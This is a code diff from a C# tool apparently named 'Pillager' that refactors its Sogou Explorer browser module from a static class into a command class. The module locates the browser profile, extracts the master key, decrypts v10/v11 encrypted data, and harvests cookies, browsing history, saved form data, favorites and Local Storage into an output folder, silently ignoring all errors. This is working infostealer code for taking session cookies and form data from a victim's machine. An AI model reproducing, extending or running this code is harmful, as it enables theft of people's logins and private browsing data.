@@ -6,16 +6,14 @@ using System.Text;
 
 namespace Pillager.Browsers
 {
-    internal static class OldSogou
+    internal class OldSogou : ICommand
     {
-        public static string BrowserName = "OldSogouExplorer";
-
-        public static string BrowserPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
+        public string BrowserPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                 "SogouExplorer\\Webkit\\Default");
 
-        public static byte[] MasterKey;
+        public byte[] MasterKey;
 
-        public static byte[] GetMasterKey()
+        public byte[] GetMasterKey()
         {
             string filePath = Path.Combine(Directory.GetParent(BrowserPath).FullName, "Local State");
             byte[] masterKey = new byte[] { };
@@ -39,13 +37,13 @@ namespace Pillager.Browsers
             }
         }
 
-        private static byte[] DecryptData(byte[] buffer)
+        private byte[] DecryptData(byte[] buffer)
         {
             byte[] decryptedData = null;
             if (MasterKey is null) return null;
             try
             {
-                string bufferString = Encoding.Default.GetString(buffer);
+                string bufferString = Encoding.UTF8.GetString(buffer);
                 if (bufferString.StartsWith("v10") || bufferString.StartsWith("v11"))
                 {
                     byte[] iv = new byte[12];
@@ -68,7 +66,7 @@ namespace Pillager.Browsers
             return decryptedData;
         }
 
-        public static string Sogou_cookies()
+        public string Sogou_cookies()
         {
             StringBuilder cookies = new StringBuilder();
             string chrome_cookie_path = Path.Combine(BrowserPath, "Cookies");
@@ -106,7 +104,7 @@ namespace Pillager.Browsers
             return cookies.ToString();
         }
 
-        public static string Sogou_history()
+        public string Sogou_history()
         {
             StringBuilder history = new StringBuilder();
             string sogou_History_path = Path.Combine(Directory.GetParent(Directory.GetParent(BrowserPath).FullName).FullName, "HistoryUrl3.db");
@@ -128,13 +126,13 @@ namespace Pillager.Browsers
             return history.ToString();
         }
 
-        public static void Save(string path)
+        public override void Save(string path)
         {
             try
             {
                 if (!Directory.Exists(BrowserPath)) return;
                 MasterKey = GetMasterKey();
-                string savepath = Path.Combine(path, BrowserName);
+                string savepath = Path.Combine(path, "OldSogouExplorer");
                 Directory.CreateDirectory(savepath);
                 string cookies = Sogou_cookies();
                 string history = Sogou_history();
@@ -142,8 +140,8 @@ namespace Pillager.Browsers
                 string favorite3 = Path.Combine(Directory.GetParent(Directory.GetParent(BrowserPath).FullName).FullName, "favorite3.dat");
                 if (File.Exists(FormData3)) File.Copy(FormData3, Path.Combine(savepath, "FormData3.dat"));
                 if (File.Exists(favorite3)) File.Copy(favorite3, Path.Combine(savepath, "favorite3.dat"));
-                if (!string.IsNullOrEmpty(cookies)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_cookies.txt"), cookies);
-                if (!string.IsNullOrEmpty(history)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_history.txt"), history);
+                if (!string.IsNullOrEmpty(cookies)) File.WriteAllText(Path.Combine(savepath, "OldSogouExplorer_cookies.txt"), cookies, Encoding.UTF8);
+                if (!string.IsNullOrEmpty(history)) File.WriteAllText(Path.Combine(savepath, "OldSogouExplorer_history.txt"), history, Encoding.UTF8);
                 if (Directory.Exists(Path.Combine(BrowserPath, "Local Storage"))) Methods.CopyDirectory(Path.Combine(BrowserPath, "Local Storage"), Path.Combine(savepath, "Local Storage"), true);
             }
             catch { }
